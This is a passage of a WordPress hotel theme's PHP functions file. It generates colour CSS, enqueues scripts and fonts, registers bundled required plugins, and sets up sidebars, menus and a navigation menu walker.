		.sohohotel-footer-social-icons-wrapper a,
		.sohohotel-footer-wrapper .sohohotel-footer-bottom-wrapper,
		.sohohotel-blog-wrapper.sohohotel-blog-wrapper-1-col .sohohotel-blog-block .sohohotel-more-link,
		.sohohotel-comments-wrapper .sohohotel-comment-count-title:after,
		.sohohotel-comments-wrapper #respond #reply-title:after,
		.sohohotel-page-pagination .wp-pagenavi span.current,
		.sohohotel-page-pagination .wp-pagenavi a:hover,
		.sohohotel-post-pagination span,
		.sohohotel-post-pagination span:hover,
		.sohohotel-page-not-found h1:after,
		.sohohotel-page-not-found form button,
		.sohohotel-search-results-wrapper .sohohotel-search-results-form button,
		.sohohotel-title1 h1:after,
		.sohohotel-title2 h3:after,
		.sohohotel-title3 h4:after,
		.sohohotel-call-to-action-1-section-inner .sohohotel-button0,
		.sohohotel-call-to-action-2-section h3:after,
		.sohohotel-call-to-action-2-section .sohohotel-button0,
		.sohohotel-icon-text-wrapper-1 .sohohotel-icon-text-block .sohohotel-text h4:after,
		.sohohotel-icon-text-wrapper-2 .sohohotel-icon-text-block h4:after,
		.sohohotel-about-us-block-wrapper .sohohotel-about-us-block h3:after,
		.sohohotel-about-us-block-wrapper .sohohotel-about-us-block .sohohotel-about-us-block-button,
		.sohohotel-about-us-video-wrapper .sohohotel-about-us-block h3:after,
		.sohohotel-about-us-video-wrapper .sohohotel-about-us-block .sohohotel-about-us-block-button,
		.vc_toggle_size_md.vc_toggle_default .vc_toggle_title h4:before,
		.wpb-js-composer .vc_tta-accordion.vc_tta.vc_general .vc_tta-panel h4.vc_tta-panel-title:before,
		.owl-theme .owl-dots .owl-dot.active span,
		body .sohohotel-site-wrapper .tnp-widget input[type="submit"].tnp-submit,
		a.slideshow-button-rooms, a.slideshow-button-testimonials,
		.sohohotel-header-4 .sohohotel-top-right-button,
		.sohohotel-header-4 .sohohotel-booking-button,
		.apply-coupon-button {
			background: ' . $sohohotel_data["main-color"] . ';
		}

		.pp_default .pp_close,
		.pp_hoverContainer .pp_previous,
		.pp_hoverContainer .pp_next {
			background-color: ' . $sohohotel_data["main-color"] . ' !important;
		}

		.sohohotel-header-1 .sohohotel-navigation li.current_page_item a strong,
		.sohohotel-header-1 .sohohotel-navigation li a:hover strong,
		.sohohotel-header-1 .sohohotel-mobile-navigation-wrapper ul li a:hover,
		.sohohotel-header-2 .sohohotel-navigation li.current_page_item a,
		.sohohotel-header-2 .sohohotel-navigation li a:hover,
		.sohohotel-header-2 .sohohotel-mobile-navigation-wrapper ul li a:hover,
		.sohohotel-header-3 .sohohotel-navigation li.current_page_item a strong,
		.sohohotel-header-3 .sohohotel-navigation li a:hover strong,
		.sohohotel-header-3 .sohohotel-mobile-navigation-wrapper ul li a:hover,
		.sohohotel-header-4 .sohohotel-navigation li.current_page_item a,
		.sohohotel-header-4 .sohohotel-navigation li a:hover,
		.sohohotel-header-4 .sohohotel-mobile-navigation-wrapper ul li a:hover,
		.sohohotel-header-5 .sohohotel-navigation li.current_page_item a,
		.sohohotel-header-5 .sohohotel-navigation li a:hover,
		.sohohotel-header-5 .sohohotel-mobile-navigation-wrapper ul li a:hover,
		.sohohotel-header-6 .sohohotel-navigation li.current_page_item a,
		.sohohotel-header-6 .sohohotel-navigation li a:hover,
		.sohohotel-header-6 .sohohotel-mobile-navigation-wrapper ul li a:hover,
		.sohohotel-main-content blockquote,
		.sohohotel-page-pagination .wp-pagenavi span.current,
		.sohohotel-page-pagination .wp-pagenavi a:hover,
		.sohohotel-icon-text-wrapper-1 .sohohotel-icon-text-block .sohohotel-icon,
		.sohohotel-icon-text-wrapper-2 .sohohotel-icon-text-block .sohohotel-icon {
			border-color: ' . $sohohotel_data["main-color"] . ';
		}

		.wpb-js-composer .vc_tta-color-grey.vc_tta-style-classic ul.vc_tta-tabs-list li.vc_tta-tab.vc_active,
		.wpb-js-composer .vc_tta.vc_general .vc_tta-panel.vc_active .vc_tta-panel-title {
			border-top: ' . $sohohotel_data["main-color"] . ' 4px solid;
		}

		.sohohotel-main-content blockquote:before,
		.sohohotel-main-content table td i,
		.sohohotel-main-content ul li:before,
		.sohohotel-main-content a,
		.sohohotel-sidebar-content .sohohotel-widget ul li:before,
		.sohohotel-footer-wrapper .sohohotel-widget ul li:before,
		.sohohotel-footer-wrapper .sohohotel-widget .sohohotel-contact-widget .sohohotel-address:before,
		.sohohotel-footer-wrapper .sohohotel-widget .sohohotel-contact-widget .sohohotel-phone:before,
		.sohohotel-footer-wrapper .sohohotel-widget .sohohotel-contact-widget .sohohotel-cell-phone:before,
		.sohohotel-footer-wrapper .sohohotel-widget .sohohotel-contact-widget .sohohotel-email:before,
		.sohohotel-blog-wrapper.sohohotel-blog-wrapper-1-col .sohohotel-blog-block .sohohotel-blog-meta .sohohotel-blog-meta-author:before,
		.sohohotel-blog-wrapper.sohohotel-blog-wrapper-1-col .sohohotel-blog-block .sohohotel-blog-meta .sohohotel-blog-meta-date:before,
		.sohohotel-blog-wrapper.sohohotel-blog-wrapper-1-col .sohohotel-blog-block .sohohotel-blog-meta .sohohotel-blog-meta-category:before,
		.sohohotel-blog-wrapper.sohohotel-blog-wrapper-1-col .sohohotel-blog-block .sohohotel-blog-meta .sohohotel-blog-meta-comments:before,
		.sohohotel-blog-wrapper-2-col .sohohotel-blog-block .sohohotel-blog-block-content .sohohotel-blog-meta .sohohotel-blog-meta-date:before,
		.sohohotel-blog-wrapper-2-col .sohohotel-blog-block .sohohotel-blog-block-content .sohohotel-blog-meta .sohohotel-blog-meta-category:before,
		.sohohotel-blog-wrapper-3-col .sohohotel-blog-block .sohohotel-blog-block-content .sohohotel-blog-meta .sohohotel-blog-meta-date:before,
		.sohohotel-blog-wrapper-3-col .sohohotel-blog-block .sohohotel-blog-block-content .sohohotel-blog-meta .sohohotel-blog-meta-category:before,
		.sohohotel-blog-wrapper-4-col .sohohotel-blog-block .sohohotel-blog-block-content .sohohotel-blog-meta .sohohotel-blog-meta-date:before,
		.sohohotel-blog-wrapper-4-col .sohohotel-blog-block .sohohotel-blog-block-content .sohohotel-blog-meta .sohohotel-blog-meta-category:before,
		.sohohotel-main-content .sohohotel-comments-wrapper .sohohotel-comments .sohohotel-comment-text ul li:before,
		.sohohotel-testimonial-wrapper-1 .sohohotel-testimonial-block div span.sohohotel-open-quote,
		.sohohotel-testimonial-wrapper-1 .sohohotel-testimonial-block div span.sohohotel-close-quote,
		.sohohotel-testimonial-wrapper-2 .sohohotel-testimonial-block div span.sohohotel-open-quote,
		.sohohotel-testimonial-wrapper-2 .sohohotel-testimonial-block div span.sohohotel-close-quote,
		.sohohotel-blog-carousel-wrapper .sohohotel-blog-block .sohohotel-blog-date:before,
		.sohohotel-icon-text-wrapper-1 .sohohotel-icon-text-block .sohohotel-icon i,
		.sohohotel-icon-text-wrapper-2 .sohohotel-icon-text-block .sohohotel-icon i,
		ul.sohohotel-social-links li i {
			color: ' . $sohohotel_data["main-color"] . ';
		}';
	
		/* Booking Plugin */
		$output .= '.datepicker__month-day--valid:hover,
		.datepicker__month-day--selected,
		.booking-form button,
		.booking-side .title-block-3,
		.booking-side button,
		.booking-room-wrapper .select-room-button,
		.booking-side .edit-booking-button,
		.booking-main .title-block-3,
		.booking-main-wrapper .booking-main .booking_payment,
		.booking-main-wrapper .booking-main .complete-booking-button,
		.booking-step-wrapper .step-title.step-title-current,
		.main-content-lightbox table th,
		.booking-main-wrapper .booking-main .select-services,
		.booking-main-wrapper .booking-main #payment-form button,
		.wide-booking-form a.room-selection-done-btn,
		.wide-booking-form-2 a.room-selection-done-btn,
		.sidebar-booking-form a.room-selection-done-btn,
		.wide-booking-form-2 button,
		.accommodation-block-content .price-button,
		.accommodation-grid-wrapper .accommodation-grid .accommodation-block .accommodation-info h4 span,
		.accommodation-block-wrapper-2 .accommodation-block .accommodation-block-image .accommodation-block-price,
		.accommodation-block-wrapper-2 .accommodation-block i,
		.accommodation-block-full-description .title-block-4,
		.sohohotel-main-content a.accommodation-block-full-button,
		.accommodation-video-section .accommodation-block-wrapper .accommodation-info h4 span,
		.block-link-wrapper-2 .block-link i,
		.block-link-wrapper-3 .block-link i,
		.block-link-wrapper-4 .block-link i,
		.hotel-image-wrapper .hotel-image .hotel-title .title-block-3,
		.sh-single-booking-form .sh-select-dates,
		.sh-single-booking-form .external_bookingbutton2 {
			background: ' . $sohohotel_data["main-color"] . ';
		}

		.datepicker__month-day--first-day-selected,
		.datepicker__month-day--last-day-selected {
			background-color: ' . $sohohotel_data["main-color"] . ';
		}

		.booking-step-wrapper .step-title.step-title-current:after {
			border-color: transparent transparent transparent ' . $sohohotel_data["main-color"] . ';
		}

		.accommodation-block-wrapper-2 .accommodation-block h4 {
			border-bottom: ' . $sohohotel_data["main-color"] . ' 2px solid;
		}';
		
	}
	
	if($sohohotel_data["secondary-color"]) {
		
		/* Theme */
		$output .= '.sohohotel-header-1 .sohohotel-mobile-navigation-wrapper,
		.sohohotel-header-2 .sohohotel-mobile-navigation-wrapper,
		.sohohotel-header-3 .sohohotel-mobile-navigation-wrapper,
		.sohohotel-header-4 .sohohotel-mobile-navigation-wrapper,
		.sohohotel-header-5 .sohohotel-mobile-navigation-wrapper,
		.sohohotel-header-6 .sohohotel-topbar-wrapper,
		.sohohotel-header-6 .sohohotel-navigation,
		.sohohotel-header-6 .sohohotel-mobile-navigation-wrapper,
		.sohohotel-footer-wrapper,
		.sohohotel-search-results-wrapper .sohohotel-search-results-form,
		.sohohotel-about-us-block-wrapper .sohohotel-about-us-block,
		.sohohotel-dark-contact-form .wpcf7,
		.sohohotel-about-us-video-wrapper .sohohotel-about-us-block,
		.pp_default #pp_full_res .pp_inline p.lightbox-darktext,
		.pp_default .sohohotel-main-content-lightbox h6 {
			background: ' . $sohohotel_data["secondary-color"] . ';
		}';

		/* Booking Plugin */
		$output .= '.datepicker__month-day,
		.datepicker__month-day--disabled,
		.sohohotel-main-content .datepicker table td  {
			border-right: ' . $sohohotel_data["secondary-color"] . ' 1px solid;
			border-bottom: ' . $sohohotel_data["secondary-color"] . ' 1px solid;
		}

		.datepicker__month-button--prev:after,
		.datepicker__month-button--next:after {
			color: ' . $sohohotel_data["secondary-color"] . ';
		}

		.datepicker__inner,
		.wide-booking-form,
		.room-price-widget .from,
		.room-price-widget .price-detail,
		.booking-side-wrapper,
		.booking-main-wrapper,
		.price-details .deposit,
		.price-details .total,
		.lightbox-title,
		.booking-step-wrapper,
		.room-guest-selection-input-wrapper,
		.vertical-booking-form,
		.wide-booking-form-2,
		.sh-image-overlay-wrapper,
		.sidebar-booking-form,
		.accommodation-carousel-wrapper-full,
		.accommodation-block-full-description,
		.accommodation-video-section .accommodation-block-wrapper .accommodation-block,
		.accommodation-video-section .accommodation-video-block,
		.block-link-wrapper-2 .block-link,
		.block-link-wrapper-3 .block-link,
		.block-link-wrapper-4 .block-link,
		.hotel-image-wrapper .hotel-image,
		.sh-single-booking-form {
			background: ' . $sohohotel_data["secondary-color"] . ';
		}

		.booking-step-wrapper .step-title:after {
			border-color: transparent transparent transparent ' . $sohohotel_data["secondary-color"] . ';
		}';

	}
	
	return $output;
	
}



/* ----------------------------------------------------------------------------

   Load Frontend Inline JS

---------------------------------------------------------------------------- */
function sohohotel_inline_js() {
	
	global $sohohotel_data;

	if($sohohotel_data["site-header-style"]) {
		if($sohohotel_data["site-header-style"] == 'sohohotel-header1') {
			$sohohotel_page_title_class = '.sohohotel-header-1';
		} elseif($sohohotel_data["site-header-style"] == 'sohohotel-header2') {
			$sohohotel_page_title_class = '.sohohotel-header-2';
		} elseif($sohohotel_data["site-header-style"] == 'sohohotel-header3') {
			$sohohotel_page_title_class = '.sohohotel-header-3';
		} elseif($sohohotel_data["site-header-style"] == 'sohohotel-header4') {
			$sohohotel_page_title_class = '.sohohotel-header-4';
		} elseif($sohohotel_data["site-header-style"] == 'sohohotel-header5') {
			$sohohotel_page_title_class = '.sohohotel-header-5';
		} elseif($sohohotel_data["site-header-style"] == 'sohohotel-header6') {
			$sohohotel_page_title_class = '.sohohotel-header-6';
		} else {
			$sohohotel_page_title_class = '.sohohotel-header-1';
		}
	}
	
	$output = '';
	$output .= "var sohohotel_siteheader = '" . $sohohotel_page_title_class . "';";
	
	if($sohohotel_data["custom_js"]) {
		$output .= $sohohotel_data["custom_js"];
	}
	
	return $output;
	
}



/* ----------------------------------------------------------------------------

   Load Frontend CSS

---------------------------------------------------------------------------- */
function sohohotel_enqueue_css() {
	wp_enqueue_style('sohohotel-color', get_template_directory_uri() .'/framework/css/color.css');
    wp_enqueue_style( 'sohohotel-style', get_stylesheet_uri() );
	wp_add_inline_style( 'sohohotel-style', sohohotel_inline_css() );
	wp_enqueue_style('sohohotel-fontawesome', get_template_directory_uri() .'/framework/css/font-awesome/css/font-awesome.min.css');
	wp_enqueue_style('sohohotel-owlcarousel', get_template_directory_uri() .'/framework/css/owl.carousel.css');
	wp_enqueue_style('sohohotel-prettyPhoto', get_template_directory_uri() .'/framework/css/prettyPhoto.css');
}
add_action( 'wp_enqueue_scripts', 'sohohotel_enqueue_css' );



/* ----------------------------------------------------------------------------

   Load Admin CSS

---------------------------------------------------------------------------- */
function sohohotel_enqueue_admin_css() {
  wp_enqueue_style('sohohotel_admin_styles', get_template_directory_uri().'/framework/css/admin.css');
  wp_enqueue_style('sohohotel_remove_ads', get_template_directory_uri().'/framework/css/remove-ads.css');
}
add_action('admin_enqueue_scripts', 'sohohotel_enqueue_admin_css');



/* ----------------------------------------------------------------------------

   Load Theme JS

---------------------------------------------------------------------------- */
function sohohotel_enqueue_js() {
	
	wp_enqueue_script( array( 'jquery-ui-core' ) );
	wp_enqueue_script( 'sohohotel-prettyPhoto', get_template_directory_uri() . '/framework/js/jquery.prettyPhoto.js' );
	wp_enqueue_script( 'sohohotel-owlcarousel', get_template_directory_uri() . '/framework/js/owl.carousel.min.js' );
	wp_enqueue_script( 'sohohotel-scripts', get_template_directory_uri() . '/framework/js/scripts.js' );
	wp_add_inline_script( 'sohohotel-scripts', sohohotel_inline_js());
	wp_enqueue_script( array( 'jquery-ui-core', 'jquery-ui-datepicker', 'jquery-ui-accordion', 'jquery-ui-tabs', 'jquery-effects-core' ) );
	
	if( is_single() ) {wp_enqueue_script( 'comment-reply' );}
	
}
add_action( 'wp_footer', 'sohohotel_enqueue_js' );



/* ----------------------------------------------------------------------------

   Remove "type" attribute from style and script tags to avoid failing W3C validation
 
---------------------------------------------------------------------------- */
add_filter('style_loader_tag', 'sohohotel_remove_type_attr', 10, 2);
add_filter('script_loader_tag', 'sohohotel_remove_type_attr', 10, 2);

function sohohotel_remove_type_attr($tag, $handle) {
    return preg_replace( "/type=['\"]text\/(javascript|css)['\"]/", '', $tag );
}



/* ----------------------------------------------------------------------------

   Enqueue Fonts

---------------------------------------------------------------------------- */
function sohohotel_fonts_url() {
	
    $font_url = '';
    
    if ( 'off' !== _x( 'on', 'Google font: on or off', 'soho-hotel' ) ) {
		
		global $sohohotel_data;
		
		if ( isset($sohohotel_data['google_font_url_1']) ) {
			$sohohotel_font_1 = esc_attr($sohohotel_data['google_font_url_1']);
		} else {
			$sohohotel_font_1 = 'Cormorant:400,400i,500,500i';
		}
		
		if ( isset($sohohotel_data['google_font_url_2']) ) {
			$sohohotel_font_2 = esc_attr($sohohotel_data['google_font_url_2']);
		} else {
			$sohohotel_font_2 = 'Open+Sans:400,400i';
		}
		
        $font_url = add_query_arg( 'family',$sohohotel_font_1 . '|' . $sohohotel_font_2, "//fonts.googleapis.com/css" );
    
	}

    return $font_url;

}

function sohohotel_font_scripts() {
    wp_enqueue_style( 'sohohotel_fonts', sohohotel_fonts_url(), array(), '1.0.0' );
}
add_action( 'wp_enqueue_scripts', 'sohohotel_font_scripts' );



/* ----------------------------------------------------------------------------

   Load Page Title

---------------------------------------------------------------------------- */
add_theme_support( 'title-tag' );



/* ----------------------------------------------------------------------------

   Required Plugins

---------------------------------------------------------------------------- */
require_once( get_template_directory() . '/framework/inc/class-tgm-plugin-activation.php');
add_action( 'tgmpa_register', 'sohohotel_theme_register_required_plugins' );

function sohohotel_theme_register_required_plugins() {

	$plugins = array(

		// This is an example of how to include a plugin bundled with a theme.
		array(
			'name'     				=> esc_html__('Soho Hotel Shortcodes & Post Types','soho-hotel'), // The plugin name
			'slug'     				=> 'sohohotel-shortcodes-post-types', // The plugin slug (typically the folder name)
			'source'   				=> get_template_directory() . '/framework/plugins/sohohotel-shortcodes-post-types.zip', // The plugin source
			'required' 				=> true, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '3.0.3', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> esc_html__('Soho Hotel Booking','soho-hotel'), // The plugin name
			'slug'     				=> 'sohohotel-booking', // The plugin slug (typically the folder name)
			'source'   				=> get_template_directory() . '/framework/plugins/sohohotel-booking.zip', // The plugin source
			'required' 				=> true, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '3.0.3', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> esc_html__('Redux Framework','soho-hotel'), // The plugin name
			'slug'     				=> 'redux-framework', // The plugin slug (typically the folder name)
			'required' 				=> true, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '3.6.15', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> esc_html__('Classic Editor','soho-hotel'), // The plugin name
			'slug'     				=> 'classic-editor', // The plugin slug (typically the folder name)
			'required' 				=> true, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '1.3', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> esc_html__('WP Bakery Page Builder','soho-hotel'), // The plugin name
			'slug'     				=> 'js_composer', // The plugin slug (typically the folder name)
			'source'   				=> get_template_directory() . '/framework/plugins/js-composer.zip', // The plugin source
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '5.7', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> esc_html__('Revolution Slider','soho-hotel'), // The plugin name
			'slug'     				=> 'revslider', // The plugin slug (typically the folder name)
			'source'   				=> get_template_directory() . '/framework/plugins/revslider.zip', // The plugin source
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '5.4.8', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> esc_html__('Contact Form 7','soho-hotel'), // The plugin name
			'slug'     				=> 'contact-form-7', // The plugin slug (typically the folder name)
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '5.1.1', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> esc_html__('Newsletter','soho-hotel'), // The plugin name
			'slug'     				=> 'newsletter', // The plugin slug (typically the folder name)
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '5.8.9', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> esc_html__('WP PageNavi','soho-hotel'), // The plugin name
			'slug'     				=> 'wp-pagenavi', // The plugin slug (typically the folder name)
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '2.93', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> esc_html__('WordPress Importer','soho-hotel'), // The plugin name
			'slug'     				=> 'wordpress-importer', // The plugin slug (typically the folder name)
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '0.6.4', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> esc_html__('Widget Importer & Exporter','soho-hotel'), // The plugin name
			'slug'     				=> 'widget-importer-exporter', // The plugin slug (typically the folder name)
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '1.5.5', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		)

	);

	$config = array(
		'id'           => 'tgmpa',                 // Unique ID for hashing notices for multiple instances of TGMPA.
		'default_path' => '',                      // Default absolute path to bundled plugins.
		'menu'         => 'tgmpa-install-plugins', // Menu slug.
		'parent_slug'  => 'themes.php',            // Parent menu slug.
		'capability'   => 'edit_theme_options',    // Capability needed to view plugin install page, should be a capability associated with the parent menu used.
		'has_notices'  => true,                    // Show admin notices or not.
		'dismissable'  => true,                    // If false, a user cannot dismiss the nag message.
		'dismiss_msg'  => '',                      // If 'dismissable' is false, this message will be output at top of nag.
		'is_automatic' => false,                   // Automatically activate plugins after installation or not.
		'message'      => '',                      // Message to output right before the plugins table.
	);

	tgmpa( $plugins, $config );
}



/* ----------------------------------------------------------------------------

   Load WP Bakery Page Builder Modifications

---------------------------------------------------------------------------- */
if (class_exists('WPBakeryVisualComposerAbstract')) {
	require_once(get_template_directory() . '/framework/inc/pagebuilder/pagebuilder_theme.php');
}



/* ----------------------------------------------------------------------------

   Load WP Bakery Page Builder Template Directory

---------------------------------------------------------------------------- */
if (class_exists('WPBakeryVisualComposerAbstract')) {
	$dir = get_stylesheet_directory() . '/framework/inc/pagebuilder/pagebuilder_templates';
	vc_set_shortcodes_templates_dir( $dir );
}



/* ----------------------------------------------------------------------------

   Register Sidebars

---------------------------------------------------------------------------- */
function sohohotel_widgets_init() {

	// Sidebar Widgets
	register_sidebar( array(
		'name' => esc_html__( 'Standard Page Sidebar', 'soho-hotel' ),
		'id' => 'sohohotel-primary-widget-area',
		'description' => esc_html__( 'Displayed on all pages with a sidebar set', 'soho-hotel' ),
		'before_widget' => '<div id="%1$s" class="sohohotel-widget sohohotel-widget-wrapper sohohotel-clearfix %2$s"><div class="sohohotel-title-block"></div>',
		'after_widget' => '</div>',
		'before_title' => '<h3>',
		'after_title' => '</h3>',
	) );
	
	// Footer Widgets 1
	register_sidebar( array(
		'name' => esc_html__( 'Footer Area', 'soho-hotel' ),
		'id' => 'sohohotel-footer-widget-area',
		'description' => esc_html__( 'Displayed at the bottom of all pages', 'soho-hotel' ),
		'before_widget' => '<div id="%1$s" class="sohohotel-widget sohohotel-widget-wrapper sohohotel-clearfix %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h5>',
		'after_title' => '</h5>',
	) );

}

add_action( 'widgets_init', 'sohohotel_widgets_init' );



/* ----------------------------------------------------------------------------

   Register Menu

---------------------------------------------------------------------------- */
if( !function_exists( 'sohohotel_register_menu' ) ) {
	
	function sohohotel_register_menu() {
		
		global $sohohotel_data;
		
		if($sohohotel_data["site-header-style"] == 'sohohotel-header3') {
			
			if($sohohotel_data["top-right-menu"]) {
				register_nav_menus(array(
					'sohohotel-primary-left' => esc_html__( 'Primary Navigation Left','soho-hotel' ),
					'sohohotel-primary-right' => esc_html__( 'Primary Navigation Right','soho-hotel' ),
					'sohohotel-top-right' => esc_html__( 'Top Right Navigation','soho-hotel' )
				));
			} else {
				register_nav_menus(array(
					'sohohotel-primary-left' => esc_html__( 'Primary Navigation Left','soho-hotel' ),
					'sohohotel-primary-right' => esc_html__( 'Primary Navigation Right','soho-hotel' )
				));
			}
			
		} else {
			
			if($sohohotel_data["top-right-menu"]) {
				register_nav_menus(array(
					'sohohotel-primary' => esc_html__( 'Primary Navigation','soho-hotel' ),
					'sohohotel-top-right' => esc_html__( 'Top Right Navigation','soho-hotel' )
				));
			} else {
				register_nav_menus(array(
					'sohohotel-primary' => esc_html__( 'Primary Navigation','soho-hotel' )
				));
			}
			
		}

	}
	
	add_action('init', 'sohohotel_register_menu');
	
}



/* ----------------------------------------------------------------------------

   Main Menu Fallback

---------------------------------------------------------------------------- */
function sohohotel_main_menu_fallback() { ?>

<ul class="fallback_menu">
	<?php wp_list_pages(array(
		'depth' => 2,
		'exclude' => '',
		'title_li' => '',
		'link_before'  => '',
		'link_after'   => '',
		'sort_column' => 'post_title',
		'sort_order' => 'ASC',
	)); ?>
</ul>

<?php }



/* ----------------------------------------------------------------------------

   Mobile Main Menu Fallback

---------------------------------------------------------------------------- */
function sohohotel_mobile_menu() { ?>

<ul class="mobile-menu">
	<?php wp_list_pages(array(
		'depth' => 2,
		'exclude' => '',
		'title_li' => '',
		'link_before'  => '',
		'link_after'   => '',
		'sort_column' => 'post_title',
		'sort_order' => 'ASC',
	)); ?>
</ul>

<?php }



/* ----------------------------------------------------------------------------

   Add Description Field to Menu

---------------------------------------------------------------------------- */
class description_walker extends Walker_Nav_Menu {
	function start_el(&$output, $item, $depth = 0, $args = array(), $id = 0)
      {
           global $wp_query;
           $indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';

           $class_names = $value = '';

           $classes = empty( $item->classes ) ? array() : (array) $item->classes;

           $class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item ) );
           $class_names = ' class="'. esc_attr( $class_names ) . ' menu-item-' . $item->ID . '"';

           $output .= $indent . '<li ' . $value . $class_names . '>';

           $attributes  = ! empty( $item->attr_title ) ? ' title="'  . esc_attr( $item->attr_title ) .'"' : '';
           $attributes .= ! empty( $item->target )     ? ' target="' . esc_attr( $item->target     ) .'"' : '';
           $attributes .= ! empty( $item->xfn )        ? ' rel="'    . esc_attr( $item->xfn        ) .'"' : '';
           $attributes .= ! empty( $item->url )        ? ' href="'   . esc_attr( $item->url        ) .'"' : '';

           $prepend = '<strong>';
           $append = '</strong>';
           $description  = ! empty( $item->description ) ? '<span>'.esc_attr( $item->description ).'</span>' : '';

           if($depth != 0) {
				$description = $append = $prepend = "";
           }

            $item_output = $args->before;
            $item_output .= '<a'. $attributes .'>';
            $item_output .= $args->link_before .$prepend.apply_filters( 'the_title', $item->title, $item->ID );
            $item_output .= $description.$args->link_after;
			$item_output .= $append;
            $item_output .= '</a>';
            $item_output .= $args->after;

            $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
		}
}



/* ----------------------------------------------------------------------------

   Page Sidebar

---------------------------------------------------------------------------- */
function sohohotel_page_sidebar($sohohotel_get_post_id) {
	
	global $sohohotel_data;
	
	$output = array();
	
	// Set Sidebar Layout
	$sohohotel_individual_layout = get_post_meta($sohohotel_get_post_id, 'sohohotel_page_layout', true);

	if ( !empty($sohohotel_individual_layout) ) {
		$output = array(
			'sohohotel-main-content'=>$sohohotel_individual_layout,
			'sohohotel-sidebar-content'=>$sohohotel_individual_layout,
			'sohohotel-content-wrapper'=>$sohohotel_individual_layout
		);
	} elseif( !empty($sohohotel_data['site-layout-style']) ) {	
		$output = array(
			'sohohotel-main-content'=>$sohohotel_data['site-layout-style'],
			'sohohotel-sidebar-content'=>$sohohotel_data['site-layout-style'],
			'sohohotel-content-wrapper'=>$sohohotel_data['site-layout-style']
		);
	} else {
		$output = array(
			'sohohotel-main-content'=>'',
			'sohohotel-sidebar-content'=>'',
			'sohohotel-content-wrapper'=>''
		);
	}
		
	return $output;

}



/* ----------------------------------------------------------------------------

   Page Layout

---------------------------------------------------------------------------- */
function sohohotel_page_title($sohohotel_get_post_id) {
